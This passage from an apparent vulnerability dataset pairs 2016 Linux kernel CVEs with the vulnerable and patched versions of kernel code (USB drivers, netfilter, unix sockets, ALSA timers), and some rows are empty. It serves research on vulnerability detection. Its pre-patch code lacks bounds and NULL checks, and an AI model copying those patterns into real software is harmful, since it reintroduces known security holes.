 return NOTIFY_DONE;

 netdev_notifier_info_init(&info, idev->dev);
 return masq_device_event(this, event, &info);
}

"
2016,DoS ,CVE-2016-3140,"
static int digi_startup(struct usb_serial *serial)
{

 struct digi_serial *serial_priv;
 int ret;



















	serial_priv = kzalloc(sizeof(*serial_priv), GFP_KERNEL);
 if (!serial_priv)
","
static int digi_startup(struct usb_serial *serial)
{
 struct device *dev = &serial->interface->dev;
 struct digi_serial *serial_priv;
 int ret;
 int i;

 /* check whether the device has the expected number of endpoints */
 if (serial->num_port_pointers < serial->type->num_ports + 1) {
 dev_err(dev, ""OOB endpoints missing\n"");
 return -ENODEV;
	}

 for (i = 0; i < serial->type->num_ports + 1 ; i++) {
 if (!serial->port[i]->read_urb) {
 dev_err(dev, ""bulk-in endpoint missing\n"");
 return -ENODEV;
		}
 if (!serial->port[i]->write_urb) {
 dev_err(dev, ""bulk-out endpoint missing\n"");
 return -ENODEV;
		}
	}

	serial_priv = kzalloc(sizeof(*serial_priv), GFP_KERNEL);
 if (!serial_priv)
"
2016,DoS ,CVE-2016-3139,"	---help---
	Support for Wacom Graphire Bluetooth and Intuos4 WL tablets.














config HID_WIIMOTE
	tristate ""Nintendo Wii / Wii U peripherals""
	depends on HID
obj-$(CONFIG_HID_ZEROPLUS)	+= hid-zpff.o
obj-$(CONFIG_HID_ZYDACRON)	+= hid-zydacron.o
obj-$(CONFIG_HID_WACOM)		+= hid-wacom.o



obj-$(CONFIG_HID_WALTOP)	+= hid-waltop.o
obj-$(CONFIG_HID_WIIMOTE)	+= hid-wiimote.o
obj-$(CONFIG_HID_SENSOR_HUB)	+= hid-sensor-hub.o
	  To compile this driver as a module, choose M here: the
	  module will be called kbtab.

config TABLET_USB_WACOM
	tristate ""Wacom Intuos/Graphire tablet support (USB)""
	depends on USB_ARCH_HAS_HCD
	select POWER_SUPPLY
	select USB
	select NEW_LEDS
	select LEDS_CLASS
	help
	  Say Y here if you want to use the USB version of the Wacom Intuos
	  or Graphire tablet.  Make sure to say Y to ""Mouse support""
	  (CONFIG_INPUT_MOUSEDEV) and/or ""Event interface support""
	  (CONFIG_INPUT_EVDEV) as well.

	  To compile this driver as a module, choose M here: the
	  module will be called wacom.

endif
# Makefile for the tablet drivers
#

# Multipart objects.
wacom-objs	:= wacom_wac.o wacom_sys.o

obj-$(CONFIG_TABLET_USB_ACECAD)	+= acecad.o
obj-$(CONFIG_TABLET_USB_AIPTEK)	+= aiptek.o
obj-$(CONFIG_TABLET_USB_GTCO)	+= gtco.o
obj-$(CONFIG_TABLET_USB_HANWANG) += hanwang.o
obj-$(CONFIG_TABLET_USB_KBTAB)	+= kbtab.o
obj-$(CONFIG_TABLET_USB_WACOM)	+= wacom.o
","	---help---
	Support for Wacom Graphire Bluetooth and Intuos4 WL tablets.

config HID_USB_WACOM
	tristate ""Wacom Intuos/Graphire tablet support (USB)""
	depends on HID
	select POWER_SUPPLY
	select NEW_LEDS
	select LEDS_CLASS
	help
	  Say Y here if you want to use the USB version of the Wacom Intuos
	  or Graphire tablet.

	  To compile this driver as a module, choose M here: the
	  module will be called wacom.

config HID_WIIMOTE
	tristate ""Nintendo Wii / Wii U peripherals""
	depends on HID
obj-$(CONFIG_HID_ZEROPLUS)	+= hid-zpff.o
obj-$(CONFIG_HID_ZYDACRON)	+= hid-zydacron.o
obj-$(CONFIG_HID_WACOM)		+= hid-wacom.o

wacom-objs			:= wacom_wac.o wacom_sys.o
obj-$(CONFIG_HID_USB_WACOM)	+= wacom.o
obj-$(CONFIG_HID_WALTOP)	+= hid-waltop.o
obj-$(CONFIG_HID_WIIMOTE)	+= hid-wiimote.o
obj-$(CONFIG_HID_SENSOR_HUB)	+= hid-sensor-hub.o
	  To compile this driver as a module, choose M here: the
	  module will be called kbtab.

















endif
# Makefile for the tablet drivers
#




obj-$(CONFIG_TABLET_USB_ACECAD)	+= acecad.o
obj-$(CONFIG_TABLET_USB_AIPTEK)	+= aiptek.o
obj-$(CONFIG_TABLET_USB_GTCO)	+= gtco.o
obj-$(CONFIG_TABLET_USB_HANWANG) += hanwang.o
obj-$(CONFIG_TABLET_USB_KBTAB)	+= kbtab.o

"
2016,DoS ,CVE-2016-3138," if (quirks == NO_UNION_NORMAL) {
		data_interface = usb_ifnum_to_if(usb_dev, 1);
		control_interface = usb_ifnum_to_if(usb_dev, 0);



 goto skip_normal_probe;
	}

"," if (quirks == NO_UNION_NORMAL) {
		data_interface = usb_ifnum_to_if(usb_dev, 1);
		control_interface = usb_ifnum_to_if(usb_dev, 0);
 /* we would crash */
 if (!data_interface || !control_interface)
 return -ENODEV;
 goto skip_normal_probe;
	}

"
2016,DoS ,CVE-2016-3137," struct usb_serial *serial = port->serial;
 struct cypress_private *priv;






	priv = kzalloc(sizeof(struct cypress_private), GFP_KERNEL);
 if (!priv)
 return -ENOMEM;
 cypress_set_termios(tty, port, &priv->tmp_termios);

 /* setup the port and start reading from the device */
 if (!port->interrupt_in_urb) {
 dev_err(&port->dev, ""%s - interrupt_in_urb is empty!\n"",
			__func__);
 return -1;
	}

 usb_fill_int_urb(port->interrupt_in_urb, serial->dev,
 usb_rcvintpipe(serial->dev, port->interrupt_in_endpointAddress),
		port->interrupt_in_urb->transfer_buffer,
"," struct usb_serial *serial = port->serial;
 struct cypress_private *priv;

 if (!port->interrupt_out_urb || !port->interrupt_in_urb) {
 dev_err(&port->dev, ""required endpoint is missing\n"");
 return -ENODEV;
	}

	priv = kzalloc(sizeof(struct cypress_private), GFP_KERNEL);
 if (!priv)
 return -ENOMEM;
 cypress_set_termios(tty, port, &priv->tmp_termios);

 /* setup the port and start reading from the device */






 usb_fill_int_urb(port->interrupt_in_urb, serial->dev,
 usb_rcvintpipe(serial->dev, port->interrupt_in_endpointAddress),
		port->interrupt_in_urb->transfer_buffer,
"
2016,DoS ,CVE-2016-3136,"
static int mct_u232_port_probe(struct usb_serial_port *port)
{

 struct mct_u232_private *priv;







	priv = kzalloc(sizeof(*priv), GFP_KERNEL);
 if (!priv)
 return -ENOMEM;

 /* Use second interrupt-in endpoint for reading. */
	priv->read_urb = port->serial->port[1]->interrupt_in_urb;
	priv->read_urb->context = port;

 spin_lock_init(&priv->lock);
","
static int mct_u232_port_probe(struct usb_serial_port *port)
{
 struct usb_serial *serial = port->serial;
 struct mct_u232_private *priv;

 /* check first to simplify error handling */
 if (!serial->port[1] || !serial->port[1]->interrupt_in_urb) {
 dev_err(&port->dev, ""expected endpoint missing\n"");
 return -ENODEV;
	}

	priv = kzalloc(sizeof(*priv), GFP_KERNEL);
 if (!priv)
 return -ENOMEM;

 /* Use second interrupt-in endpoint for reading. */
	priv->read_urb = serial->port[1]->interrupt_in_urb;
	priv->read_urb->context = port;

 spin_lock_init(&priv->lock);
"
2016,DoS Overflow +Priv Mem. Corr. ,CVE-2016-3135," struct xt_table_info *info = NULL;
 size_t sz = sizeof(*info) + size;




 /* Pedantry: prevent them from hitting BUG() in vmalloc.c --RR */
 if ((SMP_ALIGN(size) >> PAGE_SHIFT) + 2 > totalram_pages)
 return NULL;
"," struct xt_table_info *info = NULL;
 size_t sz = sizeof(*info) + size;

 if (sz < sizeof(*info))
 return NULL;

 /* Pedantry: prevent them from hitting BUG() in vmalloc.c --RR */
 if ((SMP_ALIGN(size) >> PAGE_SHIFT) + 2 > totalram_pages)
 return NULL;
"
2016,DoS Overflow +Priv Mem. Corr. ,CVE-2016-3134,"}

/* All zeroes == unconditional rule. */
static inline bool unconditional(const struct arpt_arp *arp)
{
 static const struct arpt_arp uncond;

 return memcmp(arp, &uncond, sizeof(uncond)) == 0;

}

/* Figures out from what hook each rule can be called: returns 0 if
				|= ((1 << hook) | (1 << NF_ARP_NUMHOOKS));

 /* Unconditional return/END. */
 if ((e->target_offset == sizeof(struct arpt_entry) &&
			     (strcmp(t->target.u.user.name,
				     XT_STANDARD_TARGET) == 0) &&
			     t->verdict < 0 && unconditional(&e->arp)) ||
			    visited) {
 unsigned int oldpos, size;

 if ((strcmp(t->target.u.user.name,
 const struct xt_entry_target *t;
 unsigned int verdict;

 if (!unconditional(&e->arp))
 return false;
	t = arpt_get_target_c(e);
 if (strcmp(t->u.user.name, XT_STANDARD_TARGET) != 0)
			newinfo->hook_entry[h] = hook_entries[h];
 if ((unsigned char *)e - base == underflows[h]) {
 if (!check_underflow(e)) {
 pr_err(""Underflows must be unconditional and ""
   ""use the STANDARD target with ""
   ""ACCEPT/DROP\n"");
 return -EINVAL;
			}
			newinfo->underflow[h] = underflows[h];

/* All zeroes == unconditional rule. */
/* Mildly perf critical (only if packet tracing is on) */
static inline bool unconditional(const struct ipt_ip *ip)
{
 static const struct ipt_ip uncond;

 return memcmp(ip, &uncond, sizeof(uncond)) == 0;

#undef FWINV
}

	} else if (s == e) {
		(*rulenum)++;

 if (s->target_offset == sizeof(struct ipt_entry) &&
 strcmp(t->target.u.kernel.target->name,
			   XT_STANDARD_TARGET) == 0 &&
		   t->verdict < 0 &&
 unconditional(&s->ip)) {
 /* Tail of chains: STANDARD target (return/policy) */
			*comment = *chainname == hookname
				? comments[NF_IP_TRACE_COMMENT_POLICY]
			e->comefrom |= ((1 << hook) | (1 << NF_INET_NUMHOOKS));

 /* Unconditional return/END. */
 if ((e->target_offset == sizeof(struct ipt_entry) &&
			     (strcmp(t->target.u.user.name,
				     XT_STANDARD_TARGET) == 0) &&
			     t->verdict < 0 && unconditional(&e->ip)) ||
			    visited) {
 unsigned int oldpos, size;

 if ((strcmp(t->target.u.user.name,
 const struct xt_entry_target *t;
 unsigned int verdict;

 if (!unconditional(&e->ip))
 return false;
	t = ipt_get_target_c(e);
 if (strcmp(t->u.user.name, XT_STANDARD_TARGET) != 0)
			newinfo->hook_entry[h] = hook_entries[h];
 if ((unsigned char *)e - base == underflows[h]) {
 if (!check_underflow(e)) {
 pr_err(""Underflows must be unconditional and ""
   ""use the STANDARD target with ""
   ""ACCEPT/DROP\n"");
 return -EINVAL;
			}
			newinfo->underflow[h] = underflows[h];

/* All zeroes == unconditional rule. */
/* Mildly perf critical (only if packet tracing is on) */
static inline bool unconditional(const struct ip6t_ip6 *ipv6)
{
 static const struct ip6t_ip6 uncond;

 return memcmp(ipv6, &uncond, sizeof(uncond)) == 0;

}

static inline const struct xt_entry_target *
	} else if (s == e) {
		(*rulenum)++;

 if (s->target_offset == sizeof(struct ip6t_entry) &&
 strcmp(t->target.u.kernel.target->name,
			   XT_STANDARD_TARGET) == 0 &&
		    t->verdict < 0 &&
 unconditional(&s->ipv6)) {
 /* Tail of chains: STANDARD target (return/policy) */
			*comment = *chainname == hookname
				? comments[NF_IP6_TRACE_COMMENT_POLICY]
			e->comefrom |= ((1 << hook) | (1 << NF_INET_NUMHOOKS));

 /* Unconditional return/END. */
 if ((e->target_offset == sizeof(struct ip6t_entry) &&
			     (strcmp(t->target.u.user.name,
				     XT_STANDARD_TARGET) == 0) &&
			     t->verdict < 0 &&
 unconditional(&e->ipv6)) || visited) {
 unsigned int oldpos, size;

 if ((strcmp(t->target.u.user.name,
 const struct xt_entry_target *t;
 unsigned int verdict;

 if (!unconditional(&e->ipv6))
 return false;
	t = ip6t_get_target_c(e);
 if (strcmp(t->u.user.name, XT_STANDARD_TARGET) != 0)
			newinfo->hook_entry[h] = hook_entries[h];
 if ((unsigned char *)e - base == underflows[h]) {
 if (!check_underflow(e)) {
 pr_err(""Underflows must be unconditional and ""
   ""use the STANDARD target with ""
   ""ACCEPT/DROP\n"");
 return -EINVAL;
			}
			newinfo->underflow[h] = underflows[h];
","}

/* All zeroes == unconditional rule. */
static inline bool unconditional(const struct arpt_entry *e)
{
 static const struct arpt_arp uncond;

 return e->target_offset == sizeof(struct arpt_entry) &&
 memcmp(&e->arp, &uncond, sizeof(uncond)) == 0;
}

/* Figures out from what hook each rule can be called: returns 0 if
				|= ((1 << hook) | (1 << NF_ARP_NUMHOOKS));

 /* Unconditional return/END. */
 if ((unconditional(e) &&
			     (strcmp(t->target.u.user.name,
				     XT_STANDARD_TARGET) == 0) &&
			     t->verdict < 0) || visited) {

 unsigned int oldpos, size;

 if ((strcmp(t->target.u.user.name,
 const struct xt_entry_target *t;
 unsigned int verdict;

 if (!unconditional(e))
 return false;
	t = arpt_get_target_c(e);
 if (strcmp(t->u.user.name, XT_STANDARD_TARGET) != 0)
			newinfo->hook_entry[h] = hook_entries[h];
 if ((unsigned char *)e - base == underflows[h]) {
 if (!check_underflow(e)) {
 pr_debug(""Underflows must be unconditional and ""
   ""use the STANDARD target with ""
   ""ACCEPT/DROP\n"");
 return -EINVAL;
			}
			newinfo->underflow[h] = underflows[h];

/* All zeroes == unconditional rule. */
/* Mildly perf critical (only if packet tracing is on) */
static inline bool unconditional(const struct ipt_entry *e)
{
 static const struct ipt_ip uncond;

 return e->target_offset == sizeof(struct ipt_entry) &&
 memcmp(&e->ip, &uncond, sizeof(uncond)) == 0;
#undef FWINV
}

	} else if (s == e) {
		(*rulenum)++;

 if (unconditional(s) &&
 strcmp(t->target.u.kernel.target->name,
			   XT_STANDARD_TARGET) == 0 &&
		   t->verdict < 0) {

 /* Tail of chains: STANDARD target (return/policy) */
			*comment = *chainname == hookname
				? comments[NF_IP_TRACE_COMMENT_POLICY]
			e->comefrom |= ((1 << hook) | (1 << NF_INET_NUMHOOKS));

 /* Unconditional return/END. */
 if ((unconditional(e) &&
			     (strcmp(t->target.u.user.name,
				     XT_STANDARD_TARGET) == 0) &&
			     t->verdict < 0) || visited) {

 unsigned int oldpos, size;

 if ((strcmp(t->target.u.user.name,
 const struct xt_entry_target *t;
 unsigned int verdict;

 if (!unconditional(e))
 return false;
	t = ipt_get_target_c(e);
 if (strcmp(t->u.user.name, XT_STANDARD_TARGET) != 0)
			newinfo->hook_entry[h] = hook_entries[h];
 if ((unsigned char *)e - base == underflows[h]) {
 if (!check_underflow(e)) {
 pr_debug(""Underflows must be unconditional and ""
   ""use the STANDARD target with ""
   ""ACCEPT/DROP\n"");
 return -EINVAL;
			}
			newinfo->underflow[h] = underflows[h];

/* All zeroes == unconditional rule. */
/* Mildly perf critical (only if packet tracing is on) */
static inline bool unconditional(const struct ip6t_entry *e)
{
 static const struct ip6t_ip6 uncond;

 return e->target_offset == sizeof(struct ip6t_entry) &&
 memcmp(&e->ipv6, &uncond, sizeof(uncond)) == 0;
}

static inline const struct xt_entry_target *
	} else if (s == e) {
		(*rulenum)++;

 if (unconditional(s) &&
 strcmp(t->target.u.kernel.target->name,
			   XT_STANDARD_TARGET) == 0 &&
		    t->verdict < 0) {

 /* Tail of chains: STANDARD target (return/policy) */
			*comment = *chainname == hookname
				? comments[NF_IP6_TRACE_COMMENT_POLICY]
			e->comefrom |= ((1 << hook) | (1 << NF_INET_NUMHOOKS));

 /* Unconditional return/END. */
 if ((unconditional(e) &&
			     (strcmp(t->target.u.user.name,
				     XT_STANDARD_TARGET) == 0) &&
			     t->verdict < 0) || visited) {

 unsigned int oldpos, size;

 if ((strcmp(t->target.u.user.name,
 const struct xt_entry_target *t;
 unsigned int verdict;

 if (!unconditional(e))
 return false;
	t = ip6t_get_target_c(e);
 if (strcmp(t->u.user.name, XT_STANDARD_TARGET) != 0)
			newinfo->hook_entry[h] = hook_entries[h];
 if ((unsigned char *)e - base == underflows[h]) {
 if (!check_underflow(e)) {
 pr_debug(""Underflows must be unconditional and ""
   ""use the STANDARD target with ""
   ""ACCEPT/DROP\n"");
 return -EINVAL;
			}
			newinfo->underflow[h] = underflows[h];
"
2016,DoS ,CVE-2016-3070,"#include <linux/mempolicy.h>
#include <linux/vmalloc.h>
#include <linux/security.h>

#include <linux/syscalls.h>
#include <linux/hugetlb.h>
#include <linux/hugetlb_cgroup.h>
 struct buffer_head *head, enum migrate_mode mode,
 int extra_count)
{


 int expected_count = 1 + extra_count;
 void **pslot;

 return MIGRATEPAGE_SUCCESS;
	}




 spin_lock_irq(&mapping->tree_lock);

	pslot = radix_tree_lookup_slot(&mapping->page_tree,
 set_page_private(newpage, page_private(page));
	}








 radix_tree_replace_slot(pslot, newpage);

 /*
 */
 page_unfreeze_refs(page, expected_count - 1);




 /*
	 * If moved to a different zone then also account
	 * the page for that zone. Other VM counters will be
	 * via NR_FILE_PAGES and NR_ANON_PAGES if they
	 * are mapped to swap space.
 */
 __dec_zone_page_state(page, NR_FILE_PAGES);
 __inc_zone_page_state(newpage, NR_FILE_PAGES);
 if (!PageSwapCache(page) && PageSwapBacked(page)) {
 __dec_zone_page_state(page, NR_SHMEM);
 __inc_zone_page_state(newpage, NR_SHMEM);






	}
 spin_unlock_irq(&mapping->tree_lock);

 return MIGRATEPAGE_SUCCESS;
}
 if (PageMappedToDisk(page))
 SetPageMappedToDisk(newpage);

 if (PageDirty(page)) {
 clear_page_dirty_for_io(page);
 /*
		 * Want to mark the page and the radix tree as dirty, and
		 * redo the accounting that clear_page_dirty_for_io undid,
		 * but we can't use set_page_dirty because that function
		 * is actually a signal that all of the page has become dirty.
		 * Whereas only part of our page may be dirty.
 */
 if (PageSwapBacked(page))
 SetPageDirty(newpage);
 else
 __set_page_dirty_nobuffers(newpage);
 	}

 if (page_is_young(page))
 set_page_young(newpage);
","#include <linux/mempolicy.h>
#include <linux/vmalloc.h>
#include <linux/security.h>
#include <linux/backing-dev.h>
#include <linux/syscalls.h>
#include <linux/hugetlb.h>
#include <linux/hugetlb_cgroup.h>
 struct buffer_head *head, enum migrate_mode mode,
 int extra_count)
{
 struct zone *oldzone, *newzone;
 int dirty;
 int expected_count = 1 + extra_count;
 void **pslot;

 return MIGRATEPAGE_SUCCESS;
	}

	oldzone = page_zone(page);
	newzone = page_zone(newpage);

 spin_lock_irq(&mapping->tree_lock);

	pslot = radix_tree_lookup_slot(&mapping->page_tree,
 set_page_private(newpage, page_private(page));
	}

 /* Move dirty while page refs frozen and newpage not yet exposed */
	dirty = PageDirty(page);
 if (dirty) {
 ClearPageDirty(page);
 SetPageDirty(newpage);
	}

 radix_tree_replace_slot(pslot, newpage);

 /*
 */
 page_unfreeze_refs(page, expected_count - 1);

 spin_unlock(&mapping->tree_lock);
 /* Leave irq disabled to prevent preemption while updating stats */

 /*
	 * If moved to a different zone then also account
	 * the page for that zone. Other VM counters will be
	 * via NR_FILE_PAGES and NR_ANON_PAGES if they
	 * are mapped to swap space.
 */
 if (newzone != oldzone) {
 __dec_zone_state(oldzone, NR_FILE_PAGES);
 __inc_zone_state(newzone, NR_FILE_PAGES);
 if (PageSwapBacked(page) && !PageSwapCache(page)) {
 __dec_zone_state(oldzone, NR_SHMEM);
 __inc_zone_state(newzone, NR_SHMEM);
		}
 if (dirty && mapping_cap_account_dirty(mapping)) {
 __dec_zone_state(oldzone, NR_FILE_DIRTY);
 __inc_zone_state(newzone, NR_FILE_DIRTY);
		}
	}
 local_irq_enable();

 return MIGRATEPAGE_SUCCESS;
}
 if (PageMappedToDisk(page))
 SetPageMappedToDisk(newpage);

 /* Move dirty on pages not done by migrate_page_move_mapping() */
 if (PageDirty(page))
 SetPageDirty(newpage);












 if (page_is_young(page))
 set_page_young(newpage);
"
2016,#NAME?,CVE-2016-2854,,
2016,#NAME?,CVE-2016-2853,,
2016,DoS ,CVE-2016-2847,"- nr_open
- overflowuid
- overflowgid


- protected_hardlinks
- protected_symlinks
- suid_dumpable

==============================================================






















protected_hardlinks:

A long-standing class of security issues is the ","- nr_open
- overflowuid
- overflowgid
- pipe-user-pages-hard
- pipe-user-pages-soft
- protected_hardlinks
- protected_symlinks
- suid_dumpable

==============================================================

pipe-user-pages-hard:

Maximum total number of "
2016,DoS ,CVE-2016-2782,"		(serial->num_interrupt_in == 0))
 return 0;






 /*
	* It appears that Treos and Kyoceras want to use the
	* 1st bulk in endpoint to communicate with the 2nd bulk out endpoint,
","		(serial->num_interrupt_in == 0))
 return 0;

 if (serial->num_bulk_in < 2 || serial->num_interrupt_in < 2) {
 dev_err(&serial->interface->dev, ""missing endpoints\n"");
 return -ENODEV;
	}

 /*
	* It appears that Treos and Kyoceras want to use the
	* 1st bulk in endpoint to communicate with the 2nd bulk out endpoint,
"
2016,DoS Bypass ,CVE-2016-2550,"#include <linux/mutex.h>
#include <net/sock.h>

void unix_inflight(struct file *fp);
void unix_notinflight(struct file *fp);
void unix_gc(void);
void wait_for_unix_gc(void);
struct sock *unix_get_socket(struct file *filp);
struct scm_fp_list {
 short			count;
 short			max;

 struct file		*fp[SCM_MAX_FD];
};

		*fplp = fpl;
		fpl->count = 0;
		fpl->max = SCM_MAX_FD;

	}
	fpp = &fpl->fp[fpl->count];

		*fpp++ = file;
		fpl->count++;
	}




 return num;
}

		scm->fp = NULL;
 for (i=fpl->count-1; i>=0; i--)
 fput(fpl->fp[i]);

 kfree(fpl);
	}
}
 for (i = 0; i < fpl->count; i++)
 get_file(fpl->fp[i]);
		new_fpl->max = new_fpl->count;

	}
 return new_fpl;
}
 UNIXCB(skb).fp = NULL;

 for (i = scm->fp->count-1; i >= 0; i--)
 unix_notinflight(scm->fp->fp[i]);
}

static void unix_destruct_scm(struct sk_buff *skb)
 return -ENOMEM;

 for (i = scm->fp->count - 1; i >= 0; i--)
 unix_inflight(scm->fp->fp[i]);
 return max_level;
}

 * descriptor if it is for an AF_UNIX socket.
 */

void unix_inflight(struct file *fp)
{
 struct sock *s = unix_get_socket(fp);

		}
		unix_tot_inflight++;
	}
 fp->f_cred->user->unix_inflight++;
 spin_unlock(&unix_gc_lock);
}

void unix_notinflight(struct file *fp)
{
 struct sock *s = unix_get_socket(fp);

 list_del_init(&u->link);
		unix_tot_inflight--;
	}
 fp->f_cred->user->unix_inflight--;
 spin_unlock(&unix_gc_lock);
}

","#include <linux/mutex.h>
#include <net/sock.h>

void unix_inflight(struct user_struct *user, struct file *fp);
void unix_notinflight(struct user_struct *user, struct file *fp);
void unix_gc(void);
void wait_for_unix_gc(void);
struct sock *unix_get_socket(struct file *filp);
struct scm_fp_list {
 short			count;
 short			max;
 struct user_struct	*user;
 struct file		*fp[SCM_MAX_FD];
};

		*fplp = fpl;
		fpl->count = 0;
		fpl->max = SCM_MAX_FD;
		fpl->user = NULL;
	}
	fpp = &fpl->fp[fpl->count];

		*fpp++ = file;
		fpl->count++;
	}

 if (!fpl->user)
		fpl->user = get_uid(current_user());

 return num;
}

		scm->fp = NULL;
 for (i=fpl->count-1; i>=0; i--)
 fput(fpl->fp[i]);
 free_uid(fpl->user);
 kfree(fpl);
	}
}
 for (i = 0; i < fpl->count; i++)
 get_file(fpl->fp[i]);
		new_fpl->max = new_fpl->count;
		new_fpl->user = get_uid(fpl->user);
	}
 return new_fpl;
}
 UNIXCB(skb).fp = NULL;

 for (i = scm->fp->count-1; i >= 0; i--)
 unix_notinflight(scm->fp->user, scm->fp->fp[i]);
}

static void unix_destruct_scm(struct sk_buff *skb)
 return -ENOMEM;

 for (i = scm->fp->count - 1; i >= 0; i--)
 unix_inflight(scm->fp->user, scm->fp->fp[i]);
 return max_level;
}

 * descriptor if it is for an AF_UNIX socket.
 */

void unix_inflight(struct user_struct *user, struct file *fp)
{
 struct sock *s = unix_get_socket(fp);

		}
		unix_tot_inflight++;
	}
	user->unix_inflight++;
 spin_unlock(&unix_gc_lock);
}

void unix_notinflight(struct user_struct *user, struct file *fp)
{
 struct sock *s = unix_get_socket(fp);

 list_del_init(&u->link);
		unix_tot_inflight--;
	}
	user->unix_inflight--;
 spin_unlock(&unix_gc_lock);
}

"
2016,DoS ,CVE-2016-2549," struct snd_hrtimer *stime = t->private_data;

 atomic_set(&stime->running, 0);
 hrtimer_cancel(&stime->hrt);
 hrtimer_start(&stime->hrt, ns_to_ktime(t->sticks * resolution),
		      HRTIMER_MODE_REL);
 atomic_set(&stime->running, 1);
{
 struct snd_hrtimer *stime = t->private_data;
 atomic_set(&stime->running, 0);

 return 0;
}

"," struct snd_hrtimer *stime = t->private_data;

 atomic_set(&stime->running, 0);
 hrtimer_try_to_cancel(&stime->hrt);
 hrtimer_start(&stime->hrt, ns_to_ktime(t->sticks * resolution),
		      HRTIMER_MODE_REL);
 atomic_set(&stime->running, 1);
{
 struct snd_hrtimer *stime = t->private_data;
 atomic_set(&stime->running, 0);
 hrtimer_try_to_cancel(&stime->hrt);
 return 0;
}

"
2016,DoS ,CVE-2016-2548,"		    slave->slave_id == master->slave_id) {
 list_move_tail(&slave->open_list, &master->slave_list_head);
 spin_lock_irq(&slave_active_lock);

			slave->master = master;
			slave->timer = master->timer;
 if (slave->flags & SNDRV_TIMER_IFLG_RUNNING)
 list_add_tail(&slave->active_list,
					      &master->slave_active_head);

 spin_unlock_irq(&slave_active_lock);
		}
	}
		    timer->hw.close)
			timer->hw.close(timer);
 /* remove slave links */


 list_for_each_entry_safe(slave, tmp, &timeri->slave_list_head,
					 open_list) {
 spin_lock_irq(&slave_active_lock);
 _snd_timer_stop(slave, 1, SNDRV_TIMER_EVENT_RESOLUTION);
 list_move_tail(&slave->open_list, &snd_timer_slave_list);
			slave->master = NULL;
			slave->timer = NULL;
 spin_unlock_irq(&slave_active_lock);

		}


 mutex_unlock(&register_mutex);
	}
 out:

 spin_lock_irqsave(&slave_active_lock, flags);
	timeri->flags |= SNDRV_TIMER_IFLG_RUNNING;
 if (timeri->master)

 list_add_tail(&timeri->active_list,
			      &timeri->master->slave_active_head);


 spin_unlock_irqrestore(&slave_active_lock, flags);
 return 1; /* delayed start */
}
 if (!keep_flag) {
 spin_lock_irqsave(&slave_active_lock, flags);
			timeri->flags &= ~SNDRV_TIMER_IFLG_RUNNING;


 spin_unlock_irqrestore(&slave_active_lock, flags);
		}
 goto __end;
","		    slave->slave_id == master->slave_id) {
 list_move_tail(&slave->open_list, &master->slave_list_head);
 spin_lock_irq(&slave_active_lock);
 spin_lock(&master->timer->lock);
			slave->master = master;
			slave->timer = master->timer;
 if (slave->flags & SNDRV_TIMER_IFLG_RUNNING)
 list_add_tail(&slave->active_list,
					      &master->slave_active_head);
 spin_unlock(&master->timer->lock);
 spin_unlock_irq(&slave_active_lock);
		}
	}
		    timer->hw.close)
			timer->hw.close(timer);
 /* remove slave links */
 spin_lock_irq(&slave_active_lock);
 spin_lock(&timer->lock);
 list_for_each_entry_safe(slave, tmp, &timeri->slave_list_head,
					 open_list) {


 list_move_tail(&slave->open_list, &snd_timer_slave_list);
			slave->master = NULL;
			slave->timer = NULL;
 list_del_init(&slave->ack_list);
 list_del_init(&slave->active_list);
		}
 spin_unlock(&timer->lock);
 spin_unlock_irq(&slave_active_lock);
 mutex_unlock(&register_mutex);
	}
 out:

 spin_lock_irqsave(&slave_active_lock, flags);
	timeri->flags |= SNDRV_TIMER_IFLG_RUNNING;
 if (timeri->master && timeri->timer) {
 spin_lock(&timeri->timer->lock);
 list_add_tail(&timeri->active_list,
			      &timeri->master->slave_active_head);
 spin_unlock(&timeri->timer->lock);
	}
 spin_unlock_irqrestore(&slave_active_lock, flags);
 return 1; /* delayed start */
}
 if (!keep_flag) {
 spin_lock_irqsave(&slave_active_lock, flags);
			timeri->flags &= ~SNDRV_TIMER_IFLG_RUNNING;
 list_del_init(&timeri->ack_list);
 list_del_init(&timeri->active_list);
 spin_unlock_irqrestore(&slave_active_lock, flags);
		}
 goto __end;
"
2016,DoS ,CVE-2016-2547,"		    slave->slave_id == master->slave_id) {
 list_move_tail(&slave->open_list, &master->slave_list_head);
 spin_lock_irq(&slave_active_lock);

			slave->master = master;
			slave->timer = master->timer;
 if (slave->flags & SNDRV_TIMER_IFLG_RUNNING)
 list_add_tail(&slave->active_list,
					      &master->slave_active_head);

 spin_unlock_irq(&slave_active_lock);
		}
	}
		    timer->hw.close)
			timer->hw.close(timer);
 /* remove slave links */


 list_for_each_entry_safe(slave, tmp, &timeri->slave_list_head,
					 open_list) {
 spin_lock_irq(&slave_active_lock);
 _snd_timer_stop(slave, 1, SNDRV_TIMER_EVENT_RESOLUTION);
 list_move_tail(&slave->open_list, &snd_timer_slave_list);
			slave->master = NULL;
			slave->timer = NULL;
 spin_unlock_irq(&slave_active_lock);

		}


 mutex_unlock(&register_mutex);
	}
 out:

 spin_lock_irqsave(&slave_active_lock, flags);
	timeri->flags |= SNDRV_TIMER_IFLG_RUNNING;
 if (timeri->master)

 list_add_tail(&timeri->active_list,
			      &timeri->master->slave_active_head);


 spin_unlock_irqrestore(&slave_active_lock, flags);
 return 1; /* delayed start */
}
 if (!keep_flag) {
 spin_lock_irqsave(&slave_active_lock, flags);
			timeri->flags &= ~SNDRV_TIMER_IFLG_RUNNING;


 spin_unlock_irqrestore(&slave_active_lock, flags);
		}
 goto __end;
","		    slave->slave_id == master->slave_id) {
 list_move_tail(&slave->open_list, &master->slave_list_head);
 spin_lock_irq(&slave_active_lock);
 spin_lock(&master->timer->lock);
			slave->master = master;
			slave->timer = master->timer;
 if (slave->flags & SNDRV_TIMER_IFLG_RUNNING)
 list_add_tail(&slave->active_list,
					      &master->slave_active_head);
 spin_unlock(&master->timer->lock);
 spin_unlock_irq(&slave_active_lock);
		}
	}
		    timer->hw.close)
			timer->hw.close(timer);
 /* remove slave links */
 spin_lock_irq(&slave_active_lock);
 spin_lock(&timer->lock);
 list_for_each_entry_safe(slave, tmp, &timeri->slave_list_head,
					 open_list) {


 list_move_tail(&slave->open_list, &snd_timer_slave_list);
			slave->master = NULL;
			slave->timer = NULL;
 list_del_init(&slave->ack_list);
 list_del_init(&slave->active_list);
		}
 spin_unlock(&timer->lock);
 spin_unlock_irq(&slave_active_lock);
 mutex_unlock(&register_mutex);
	}
 out:

 spin_lock_irqsave(&slave_active_lock, flags);
	timeri->flags |= SNDRV_TIMER_IFLG_RUNNING;
 if (timeri->master && timeri->timer) {
 spin_lock(&timeri->timer->lock);
 list_add_tail(&timeri->active_list,
			      &timeri->master->slave_active_head);
 spin_unlock(&timeri->timer->lock);
	}
